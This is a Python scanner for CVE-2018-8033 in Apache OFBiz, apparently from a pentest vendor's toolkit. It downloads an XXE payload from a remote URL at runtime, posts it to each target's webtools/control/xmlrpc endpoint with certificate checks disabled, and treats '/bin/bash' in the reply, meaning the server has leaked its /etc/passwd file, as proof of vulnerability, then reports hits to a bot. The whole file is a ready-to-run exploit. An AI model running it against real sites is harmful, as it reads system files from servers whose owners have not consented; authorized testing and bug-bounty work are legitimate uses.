#!/usr/bin/env python

"""
 * CVE-2018-8033
 * CVE-2018-8033 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */
 
"""
from cve20188033.includes import bot
from cve20188033.utils import configure
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from cve20188033.includes import writefile
from cve20188033.utils import const
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(const.Data.payloadurl)
            headers = {
                "Content-Type": "application/xml",
                "Accept": "application/xml",
                "Tool-Name": "CVE-2018-8033",
                "Developed-by": "cappriciosec.com",
                "Contact-us": "contact@cappriciosec.com"
            }

            try:
                endpoint = "webtools/control/xmlrpc"
                if url.endswith('/'):
                    url = url[:-1]
                fullurl = f'{url}/{endpoint}'
                response = session.post(
                    fullurl, data=payreq, headers=headers, verify=False, timeout=5)
                print(f'Checking ===> {url}')
                if response.status_code == 200:
                    if f'/bin/bash' in response.text :
                        outputprint = (
                            f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                            f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                            f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n"
                        )
                        print(outputprint)
                        if configure.check_id() == "Exist":
                            bot.sendmessage(fullurl)
                        if output is not None:
                            writefile.writedata(
                                output, str(f'{fullurl}\n')) 
            except requests.exceptions.RequestException as e:
                print(
                    f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {url}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
